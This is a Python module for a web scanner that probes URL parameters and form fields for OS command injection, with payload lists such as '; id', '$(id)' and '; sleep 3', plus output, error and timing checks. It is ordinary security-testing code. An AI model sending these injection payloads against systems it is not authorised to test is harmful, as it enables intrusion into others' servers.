"""Command Injection Scanner Module"""

import re
import time
from typing import Any

import requests


class CommandInjectionScanner:
    """OS Command Injection vulnerability scanner"""

    def __init__(self, timeout: int = 10, user_agent: str = None):
        self.timeout = timeout
        self.user_agent = user_agent or "WebCross-Scanner/1.0"

        # Command injection payloads (Unix/Windows)
        self.payloads = [
            # Basic command separators
            ("; id", "uid="),
            ("| id", "uid="),
            ("|| id", "uid="),
            ("& id", "uid="),
            ("&& id", "uid="),
            ("`id`", "uid="),
            ("$(id)", "uid="),

            # Windows variants
            ("| whoami", None),
            ("& whoami", None),
            ("|| whoami", None),

            # Newline injection
            ("\nid", "uid="),
            ("\r\nid", "uid="),

            # Encoded variants
            ("%0aid", "uid="),
            ("%0did", "uid="),

            # Backtick execution
            (";`sleep 3`", None),
            ("|`sleep 3`", None),
        ]

        # Time-based payloads
        self.time_payloads = [
            ("; sleep 3", 3),
            ("| sleep 3", 3),
            ("|| sleep 3", 3),
            ("& sleep 3 &", 3),
            ("`sleep 3`", 3),
            ("$(sleep 3)", 3),
            ("& ping -c 3 127.0.0.1 &", 3),  # Windows/Unix ping
        ]

        # Error patterns indicating command execution
        self.error_patterns = [
            r"sh: \d+:",
            r"command not found",
            r"syntax error",
            r"Permission denied",
            r"cannot find the path",
            r"is not recognized as",
            r"not found",
            r"/bin/sh",
            r"/bin/bash",
        ]

    def _make_request(self, url: str, method: str = "GET",
                      data: dict = None, params: dict = None) -> requests.Response | None:
        try:
            headers = {"User-Agent": self.user_agent}
            if method.upper() == "GET":
                return requests.get(url, params=params, headers=headers,
                                  timeout=self.timeout, verify=False)
            else:
                return requests.post(url, data=data, headers=headers,
                                   timeout=self.timeout, verify=False)
        except Exception:
            return None

    def _check_output_based(self, response: requests.Response,
                           payload: str, expected: str) -> dict | None:
        """Check for command output in response"""
        if not response or not expected:
            return None

        if expected in response.text:
            return {
                "type": "COMMAND_INJECTION",
                "payload": payload,
                "evidence": f"Command output detected: {expected}",
                "confidence": "HIGH"
            }
        return None

    def _check_error_based(self, response: requests.Response, payload: str) -> dict | None:
        """Check for command error messages"""
        if not response:
            return None

        for pattern in self.error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return {
                    "type": "COMMAND_INJECTION_ERROR",
                    "payload": payload,
                    "evidence": f"Command error pattern: {pattern}",
                    "confidence": "MEDIUM"
                }
        return None

    def _check_time_based(self, url: str, param: str) -> dict | None:
        """Check for time-based command injection"""
        from urllib.parse import parse_qs, urlencode, urlparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        for payload, expected_delay in self.time_payloads[:3]:  # Limit for speed
            params[param] = [payload]
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"

            start_time = time.time()
            self._make_request(test_url)
            elapsed = time.time() - start_time

            if elapsed >= expected_delay - 0.5:
                return {
                    "type": "COMMAND_INJECTION_TIME",
                    "payload": payload,
                    "evidence": f"Response delayed {elapsed:.2f}s (expected {expected_delay}s)",
                    "confidence": "HIGH"
                }
        return None

    def scan_url(self, url: str) -> list[dict[str, Any]]:
        """Scan URL for command injection"""
        findings = []
        from urllib.parse import parse_qs, urlencode, urlparse

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return findings

        for param in params:
            for payload, expected in self.payloads[:8]:
                test_params = params.copy()
                test_params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"

                response = self._make_request(test_url)

                # Check output
                result = self._check_output_based(response, payload, expected)
                if result:
                    result["parameter"] = param
                    result["url"] = url
                    findings.append(result)
                    break

                # Check errors
                result = self._check_error_based(response, payload)
                if result:
                    result["parameter"] = param
                    result["url"] = url
                    findings.append(result)

            # Time-based check
            time_result = self._check_time_based(url, param)
            if time_result:
                time_result["parameter"] = param
                time_result["url"] = url
                findings.append(time_result)

        return findings

    def scan_form(self, url: str, form: dict) -> list[dict[str, Any]]:
        """Scan form for command injection"""
        findings = []
        action = form.get('action', url)
        method = form.get('method', 'GET').upper()
        inputs = form.get('inputs', {})

        for field in inputs:
            for payload, expected in self.payloads[:5]:
                test_data = inputs.copy()
                test_data[field] = payload

                if method == "GET":
                    response = self._make_request(action, params=test_data)
                else:
                    response = self._make_request(action, method="POST", data=test_data)

                result = self._check_output_based(response, payload, expected)
                if result:
                    result["parameter"] = field
                    result["url"] = action
                    result["method"] = method
                    findings.append(result)
                    break

                result = self._check_error_based(response, payload)
                if result:
                    result["parameter"] = field
                    result["url"] = action
                    result["method"] = method
                    findings.append(result)

        return findings
